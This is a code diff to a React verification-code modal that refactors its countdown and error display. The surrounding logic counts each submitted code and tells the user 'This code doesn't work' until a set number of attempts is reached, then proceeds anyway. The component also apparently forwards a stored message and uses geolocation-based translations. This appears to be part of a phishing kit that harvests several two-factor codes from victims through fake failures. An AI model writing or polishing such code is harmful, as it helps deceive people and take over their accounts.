@@ -12,7 +12,6 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [code, setCode] = useState('');
     const [countdown, setCountdown] = useState(0);
     const [isLoading, setIsLoading] = useState(false);
-    const [showError, setShowError] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
     const { geoInfo, messageId, message, setMessage, setMessageId } = store();
@@ -42,20 +41,18 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     }, [geoInfo]);
 
     useEffect(() => {
-        if (countdown > 0) {
-            const timer = setTimeout(() => {
-                setCountdown(countdown - 1);
-            }, 1000);
-            return () => clearTimeout(timer);
-        } else if (countdown === 0 && showError) {
-            setShowError(false);
-        }
-    }, [countdown, showError]);
+        if (countdown <= 0) return;
+
+        const timer = setTimeout(() => {
+            setCountdown((current) => current - 1);
+        }, 1000);
+
+        return () => clearTimeout(timer);
+    }, [countdown]);
 
     const handleSubmit = async () => {
         if (!code.trim() || isLoading || code.length < 6 || countdown > 0 || !message) return;
 
-        setShowError(false);
         setIsLoading(true);
 
         const next = attempts + 1;
@@ -78,7 +75,6 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
             if (next >= maxCode) {
                 nextStep();
             } else {
-                setShowError(true);
                 setCode('');
                 setCountdown(loadingTime);
             }
@@ -118,7 +114,7 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                             {t('Code')}
                         </label>
                     </div>
-                    {showError && (
+                    {countdown > 0 && (
                         <p className='mt-2 text-[15px] text-red-500'>
                             {t("This code doesn't work. Check it's correct or try a new one after")} {countdown}s.
                         </p>
